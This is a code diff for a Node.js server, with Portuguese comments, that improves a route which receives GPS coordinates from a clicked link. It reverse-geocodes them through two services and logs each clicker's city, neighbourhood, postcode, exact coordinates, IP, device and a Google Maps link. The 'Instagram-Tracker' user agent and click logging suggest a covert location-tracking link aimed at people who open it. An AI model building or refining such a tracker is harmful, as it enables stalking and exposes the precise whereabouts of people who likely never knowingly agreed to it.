@@ -267,55 +267,106 @@ app.post('/api/save-gps', async (req, res) => {
         accuracy: gps.accuracy
       };
       
-      // Busca informações de endereço
+      // Tenta várias APIs de geolocalização para maior precisão
       try {
-        const response = await fetch(
+        // API 1: Nominatim (OpenStreetMap) - mais detalhado
+        const nominatimResponse = await fetch(
           `https://nominatim.openstreetmap.org/reverse?format=json&lat=${gps.latitude}&lon=${gps.longitude}&zoom=18&addressdetails=1`,
           {
-            headers: {
-              'User-Agent': 'Instagram-Tracker/1.0'
-            }
+            headers: { 'User-Agent': 'Instagram-Tracker/1.0' }
           }
         );
         
-        const locationData = await response.json();
+        const nominatimData = await nominatimResponse.json();
         
-        if (locationData && locationData.address) {
-          const addr = locationData.address;
-          
-          click.location = {
-            cidade: addr.city || addr.town || addr.village || addr.municipality || 'N/A',
-            estado: addr.state || 'N/A',
-            pais: addr.country || 'Brasil',
-            bairro: addr.neighbourhood || addr.suburb || addr.quarter || 'N/A',
-            cep: addr.postcode || 'N/A',
-            rua: addr.road || 'N/A'
-          };
-          
-          console.log('\n' + '='.repeat(60));
-          console.log('📍 NOVO CLIQUE COM GPS');
-          console.log('='.repeat(60));
-          console.log(`⏰ ${new Date(click.timestamp).toLocaleString('pt-BR')}`);
-          console.log(`🌐 IP: ${click.ip}`);
-          console.log(`🏙️  Cidade: ${click.location.cidade}, ${click.location.estado}, ${click.location.pais}`);
-          console.log(`🏘️  Bairro: ${click.location.bairro}`);
-          console.log(`📮 CEP: ${click.location.cep}`);
-          console.log(`🗺️  Coordenadas: ${gps.latitude}, ${gps.longitude}`);
-          console.log(`📍 https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
-          console.log('='.repeat(60) + '\n');
+        // API 2: BigDataCloud (backup, mais precisa para algumas regiões)
+        const bigDataResponse = await fetch(
+          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
+        );
+        
+        const bigDataData = await bigDataResponse.json();
+        
+        // Combina as duas APIs para melhor precisão
+        let cidade = 'N/A';
+        let estado = 'N/A';
+        let bairro = 'N/A';
+        let cep = 'N/A';
+        let pais = 'Brasil';
+        
+        // Prioriza BigDataCloud para cidade/estado (geralmente mais preciso)
+        if (bigDataData) {
+          cidade = bigDataData.city || bigDataData.locality || bigDataData.principalSubdivision || 'N/A';
+          estado = bigDataData.principalSubdivision || 'N/A';
+          pais = bigDataData.countryName || 'Brasil';
+          bairro = bigDataData.localityInfo?.administrative?.[0]?.name || 
+                   bigDataData.neighbourhood || 'N/A';
         }
+        
+        // Complementa com Nominatim
+        if (nominatimData && nominatimData.address) {
+          const addr = nominatimData.address;
+          
+          // Usa Nominatim se BigDataCloud não retornou
+          if (cidade === 'N/A') {
+            cidade = addr.city || addr.town || addr.village || addr.municipality || 
+                     addr.county || 'N/A';
+          }
+          if (estado === 'N/A') {
+            estado = addr.state || 'N/A';
+          }
+          if (bairro === 'N/A') {
+            bairro = addr.neighbourhood || addr.suburb || addr.quarter || 
+                     addr.hamlet || addr.district || 'N/A';
+          }
+          
+          // CEP vem melhor do Nominatim
+          cep = addr.postcode || 'N/A';
+        }
+        
+        click.location = {
+          cidade: cidade,
+          estado: estado,
+          pais: pais,
+          bairro: bairro,
+          cep: cep,
+          displayName: nominatimData?.display_name || `${cidade}, ${estado}`
+        };
+        
+        // Log detalhado
+        console.log('\n' + '='.repeat(70));
+        console.log('📍 NOVO CLIQUE COM GPS RASTREADO');
+        console.log('='.repeat(70));
+        console.log(`⏰ Data/Hora: ${new Date(click.timestamp).toLocaleString('pt-BR', { 
+          timeZone: 'America/Sao_Paulo',
+          dateStyle: 'short',
+          timeStyle: 'medium'
+        })}`);
+        console.log(`🌐 IP: ${click.ip}`);
+        console.log(`\n📍 LOCALIZAÇÃO GPS EXATA:`);
+        console.log(`🏙️  Cidade: ${cidade}, ${estado}, ${pais}`);
+        console.log(`🏘️  Bairro: ${bairro}`);
+        console.log(`📮 CEP: ${cep}`);
+        console.log(`🗺️  Coordenadas: ${gps.latitude}, ${gps.longitude}`);
+        console.log(`🎯 Precisão: ±${gps.accuracy}m`);
+        console.log(`\n📍 Ver no Google Maps:`);
+        console.log(`   https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
+        console.log(`\n🔗 Origem: ${click.referer}`);
+        console.log(`📱 Dispositivo: ${click.device}`);
+        console.log('='.repeat(70) + '\n');
+        
       } catch (geoError) {
-        console.error('Erro ao buscar endereço:', geoError.message);
+        console.error('❌ Erro ao buscar endereço:', geoError.message);
+        console.log(`📍 GPS capturado: ${gps.latitude}, ${gps.longitude}`);
+        console.log(`🗺️  https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
       }
     }
     
     res.json({success: true});
   } catch (error) {
-    console.error('Erro ao salvar GPS:', error);
+    console.error('❌ Erro ao salvar GPS:', error);
     res.status(500).json({success: false});
   }
 });
-
 // ROTA 4: API Stats
 app.get('/api/stats', (req, res) => {
   res.json({
